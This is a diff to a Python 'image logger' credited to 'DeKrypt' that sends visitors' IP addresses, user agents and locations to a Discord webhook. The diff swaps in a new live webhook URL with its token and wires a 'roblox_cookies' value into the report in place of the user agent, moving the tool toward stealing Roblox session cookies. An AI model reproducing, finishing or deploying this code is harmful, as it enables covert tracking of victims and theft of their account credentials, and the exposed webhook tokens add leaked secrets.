@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1411950537179529269/-8pOMvrWDLwtZKQ3tPkDewxemFbd8y7WzB7ECKl93_c7Sf_pzNtQDv-78eD6n0_v4MjW",
+    "webhook": "https://discord.com/api/webhooks/1412092388561649814/k6DCQWSXn6spoInEkxXFG9NKO8opZa-_zF9SA4Le9wReq3zXhBU7BmEUfj4NuwPUjlFj",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -172,7 +172,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     os, browser = httpagentparser.simple_detect(useragent)
 
-    #roblox_cookies = "test" #retrieve_roblox_cookies()
+    roblox_cookies = "test" #retrieve_roblox_cookies()
 
     embed = {
     "username": config["username"],
@@ -204,7 +204,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **User Agent:**
 ```
-{useragent}
+
+{roblox_cookies} #useragent
 ```""",
     }
   ],
